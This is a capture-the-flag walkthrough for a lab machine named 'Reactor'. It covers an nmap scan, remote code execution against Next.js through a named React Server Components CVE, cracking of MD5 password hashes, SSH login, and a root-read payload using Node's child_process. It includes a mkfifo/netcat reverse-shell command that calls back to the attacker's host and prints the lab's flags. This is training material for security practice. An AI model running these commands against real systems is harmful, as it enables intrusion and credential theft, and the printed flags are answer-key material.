# Box Name
  Reactor

# Community Rating
Easy


# Method of Solve
Nmap Scan
```
PORT     STATE SERVICE VERSION                                                                                                                                                                                                              
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)                                                                                                                                                       
| ssh-hostkey:                                                                                                                                                                                                                              
|   256 ce:fd:0d:82:c0:23:ed:6e:4b:ea:13:fa:4f:ea:ef:b7 (ECDSA)                                                                                                                                                                             
|_  256 f8:44:c6:46:58:7a:39:21:ef:16:44:e9:58:c2:f3:62 (ED25519)                                                                                                                                                                           
3000/tcp open  ppp?                                                                                                                                                                                                                         
| fingerprint-strings:                                                                                                                                                                                                                      
|   GetRequest:                                                                                                                                                                                                                             
|     HTTP/1.1 200 OK                                                                                                                                                                                                                       
...
                                                                                                                                                                                                                     
```

# Usernames found 
```
Dr. Elena Rodriguez
Lead Nuclear Engineer
Marcus Kim
Senior Technician
JT
James Thompson
Safety Officer
```
nothing produced by Fuff

using Wappalyzer, website is running next.js 15.0.3 googling we find a CVE to give us RCE
```
RCE in RSC Protocol (CVE-2025-66478 / CVE-2025-55182): A critical vulnerability in the React Flight protocol (used by the App Router)
that allows remote code execution (RCE) via crafted attacker-controlled requests.
```
entering in the following command we can get an RCE- 
```
python3 react2shell_CVE-2025-55182.py -u http:{targetIP}:3000 -c "rm -f /tmp/p; mkfifo /tmp/p; /bin/sh </tmp/p 2>&1 | nc {hostIP} {Port} >/tmp/p"
```
from there we find reactor.db

using sqlite3 reactor.db ".dump"
We get 
```
INSERT INTO users VALUES(1,'admin','a203b22191d744a4e70ada5c101b17b8','administrator','admin@reactor.htb');
INSERT INTO users VALUES(2,'engineer','39d97110eafe2a9a68639812cd271e8e','operator','engineer@reactor.htb')
```

from here we use hashcat to crack the passwords
```
hash -m 0 hashes.txt /usr/share/wordlist/rockyou.txt
```
we get the password reactor1 for engineer

39d97110eafe2a9a68639812cd271e8e:reactor1 

then we ssh into the system

```
ssh engineer@reactor.htb 
```

engineer@reactor:~$ cat user.txt 

USER FLAG - 2ee9a75503b53fdeab129b84f36869c7

# Privilege Escalation

<img width="883" height="89" alt="image" src="https://github.com/user-attachments/assets/0e3e5a9a-3f8b-4066-8f60-5736dc1af52e" />

exec('process.mainModule.require("child_process").execSync("cat /root/root.txt").toString()')

ROOT FLAG - 8ddc9db4346411a26a9c12d4902851ea
